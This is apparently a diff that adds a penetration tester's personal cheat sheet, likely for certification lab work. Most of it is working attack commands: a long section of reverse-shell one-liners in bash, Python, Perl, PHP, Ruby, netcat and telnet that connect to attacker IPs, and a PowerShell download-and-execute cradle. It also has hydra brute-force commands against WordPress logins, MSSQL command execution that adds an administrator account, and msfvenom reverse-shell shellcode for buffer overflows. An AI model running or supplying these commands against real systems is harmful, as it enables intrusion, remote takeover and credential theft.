+        Nmap List all SMB scripts installed
+        ls -l /usr/share/nmap/scripts/smb*
+
+        Enumerate SMB Users
+
+        nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14
+
+        OR
+
+        python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip
+
+        RID Cycling - Null Sessions
+        ridenum.py $ip 500 50000 dict.txt
+
+        Manual Null Session Testing
+
+        Windows: net use \\$ip\IPC$ "" /u:""
+
+        Linux: smbclient -L //$ip
+
+Port Scan
+==========
+
+* TCP portscan using netcat
+nc -nvv -w 1 -z 10.0.0.19 3388-3390
+
+* UDP portscan using netcat
+nc -u -nvv -w 1 -z 10.0.0.19 3388-3390
+
+* Ping sweep
+nmap -sn 10.11.1.1-254
+
+
+
+Compile exploit
+==============
+gcc -Wl,--hash-style=both -o sock sockpage.c
+
+Reverse Shell Cheat Sheet
+========================
+
+* Bash reverse shell 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/192.168.178.102/5555 0>&1
+
+
+* Bash Reverse Shell
+exec 5<>/dev/tcp/attackerip/4444
+exec 5<>/dev/tcp/192.168.178.102/9999
+cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
+while read line 0<&5; do $line 2>&5 >&5; done
+
+* Perl reverse Shell
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+* Perl reverse shell
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+* Python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.192",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.102",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.101",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.192",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["c:\\windows\\system32\\cmd.exe",""]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.192",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["c:\\windows\\system32\\cmd.exe",""]);'
+
+* PHP reverse shell
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.178.102",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+* PHP meterpreter reverse shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.122.13 LPORT=443 -f raw > code.php
+
+* php-reverseshell
+cp /oscp/reverse_shells/php/php-reverse-shell-1.0/php-reverse-shell.php rev.php
+
+* PHP simple shell Linux
+<?php $cmd=$_GET[‘cmd’]; echo `$cmd`; ?>
+
+* Ruby Reverse shell
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+* Ruby Reverse Shell target windows
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+
+* Netcat reverse Shell
+nc -e /bin/sh 10.0.0.1 1234
+
+* Netcat reverse Shell Bash
+/bin/sh | nc attackerip 4444
+/bin/sh -i | nc 192.168.178.102 9999
+
+* Netcat reverse Shell without nc -e 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.11.0.192 5555 >f
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 192.168.178.102 9999 >f
+mkfifo f;cat f|/bin/sh -i 2>&1|nc 192.168.178.102 9999 >f
+
+
+* Netcat Reverse Shell without bash
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+
+* Java reverse shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+* xterm 
+xterm -display 10.0.0.1:1
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+Xnest :1
+You’ll need to authorise the target to connect to you (command also run on your host):
+xhost +targetip
+
+* Telnet reverse Shell
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+rm -f p; mknod p p && telnet 192.168.178.102 9999 0/p
+rm -f p; mknod p p && telnet 10.10.10.101 9999 0/p
+
+* Telnet Reverse Shell
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
+telnet 192.168.178.102 5555 | /bin/bash | telnet 192.168.178.102 4445   # Remember to listen on your machine also on port 4445/tcp
+
+* Shell from TCPDUMP
+ echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root
+From within IRB: exec "/bin/sh"
+
+* From within vi: 
+:!bash or
+:set shell=/bin/bash:shell
+
+From within vim 
+':!bash':
+
+From within nmap: 
+!sh
+
+* Windows Powershell/Unicorn Reverse Shell
+cd /opt/unicorn
+python unicorn.py windows/meterpreter/reverse_https X.X.X.X 4444 
+Payload for code execution:
+	Powershell IEX(New Object Net.WebClient).downloadString('http://foobar/unicorn.txt')
+cp powershell_attack.txt /var/www/html/
+mfsconsole -r unicorn.rc
+
+Good Users
+==========
+ftpuser:ftpuser
+bob:lablab
+
+Bruteforce
+==========
+
+HTTP POST FORM BRUTE FORCE
+hydra -L ../usernames.txt -P /root/scripts/wordlist/CeWL/pw.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I
+
+WORDPRESS ADMIN BRUTE FORCE
+hydra -l admin -P cewl.txt 10.11.1.234 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.11.1.234%2Fwp-admin%2F&testcookie=1:F=ERROR" -I
+
+WORDPRESS ENUMERATE USER NAME BRUTE FORCE
+hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+WORDPRESS BRUTE FORCE PASSWORD
+hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+
+HTTP .htaccess brute force
+medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
+
+
+
+HYDRA username variantions as passwords
+/root/scripts/hydra  -l USERNAME -e nsr ftp://192.168.178.110
+       -e nsr additional  checks,  "n"  for  null  password, "s" try login as
+              pass, "r" try the reverse login as pass
+
+HYDRA VERBOSE MODE
+/root/scripts/hydra -v -V -u -L which_one_lol.txt -P which_one_lol.txt -t 1 -u troll ssh
+
+
+IDENTIFY WINDOWS SERVICE PACK
+=================================
+C:\WINDOWS\System32
+
+apphelp.dll	-> SP3
+xpsp1res.dll	-> SP1
+xpsp2res.dll	-> SP2
+xpsp3res.dll	-> SP3
+
+SHELL THROUH MSSQL
+==================
+SA account has admistrative permissions
+-> msfconsole
+use auxiliary/admin/mssql/mssql_exec
+set RHOST 10.11.1.31
+set PASSWORD xxxx 
+set CMD cmd.exe /c net user /add gamma gamma
+run
+set CMD cmd.exe /c "net localgroup \"Remote Desktop Users\" /add"
+run
+set CMD cmd.exe /c net localgroup "Administrators" gamma /add
+run
+-> login through remote desktop
+
+LINUX LOOTING
+=============
+search -f *.txt
+search -f *.zip
+search -f *.doc
+search -f *.xls
+search -f config*
+search -f *.rar
+search -f *.docx
+search -f *.sql
+
+find / -name "*.txt"
+find / -name "*.doc*"
+find / -name "*.rar"
+find / -name "*.xls*"
+find / -name "*.doc"
+find / -name "*.sql"
+
+
+.ssh:
+.bash_history
+
+Linux Priviledge Escalation
+============================
+#World writable files directories
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+
+# World executable folder
+find / -perm -o x -type d 2>/dev/null
+
+# World writable and executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+
+* suid binaries
+find / -perm /u=s -type f
+
+* Cronjob
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+ls -al /etc/cron.d/
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+
+* World Writeable Directories
+
+/tmp
+/var/tmp
+/dev/shm
+/var/spool/vbox
+/var/spool/samba
+
+* Find mysql password
+grep -Rni "DB_PASS" /
+grep -Rni "DB_USER" /
+
+
+* Look for running cron jobs:
+#!/bin/bash
+# Loop by line
+IFS=$'\n'
+old_process=$(ps -eo command)
+while true; do
+	new_process=$(ps -eo command)
+	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
+	sleep 1
+	old_process=$new_process
+done
+
+
+=========
+Cracking Passwords
+
+* Crack Raw MD5
+john --format=raw-md5 hashfilepath
+
+* Crack ZIP/RAR
+zip2john zipfile > output.txt
+rar2john rarfile > output.txt
+-> than john
+
+* characters a 1-8 length
+fcrackzip -b -c a -l 1-8 -u -v lmao.zip
+
+* dictorny 
+fcrackzip -u -D -p passwordlist.txt lmao.zip 
+
+* generate password list
+https://charlesreid1.com/wiki/John_the_Ripper/Password_Generation
+
+cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+-> -m min word length 6
+-> -w output to file
+
+nano /etc/john/john.conf
+john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
+
+
+* using Crunch
+# crunch 6 6 0123456789ABCDEF -o crunch1.txt
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
+
+
+
+=========================
+Buffer Overflow
+
+# Payload
+payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
+
+Find Offset of EIP in Buffer
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
+
+BadChars
+badchars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+
+
+
+In ImmunityDebug:
+!mona modules
+find a module that has:
+rebase: false
+safeseh: false
+aslr: false
+nxcompat: fals
+
+View -> Executable Modules
+Right click -> view memory  on tht module
+View Code in CPU
+
+Find a JMP ESP
+usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+00000000 FFE4 jmp esp
+
+!mona find -s "\xff\xe4" -m slmfc.dll
+
+shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.192 R LPORT=9999 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+
+* /bin/bash linux execve
+msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
+
+
+shellcode keeps running when SLmail crashes
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.192 R LPORT=9999 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXITFUNC=thread
+
+* small shellcode
+
+msfvenom -p windows/shell_reverse_tcp -a x86 -f python --platform windows LHOST=<ip> LPORT=443 -b "\x00" EXITFUNC=thread --smallest -e x86/fnstenv_mov
+
+
+====================
+
+PROOF:
+
+* Linux proof
+
+hostname && whoami && cat proof.txt && /sbin/ifconfig
+
+* Windows proof
+
+hostname && whoami.exe && type proof.txt && ipconfig /all
+
+
+=================
+
+JPEG Anaylis
+------------
+
+exiftool a.jpg
+binwalk a.jpg
+
+==================
+WEBDAV
+------
+* davtest -url http://foobar:80
+-> test what file extensions are allowed to be uploaded
+
+
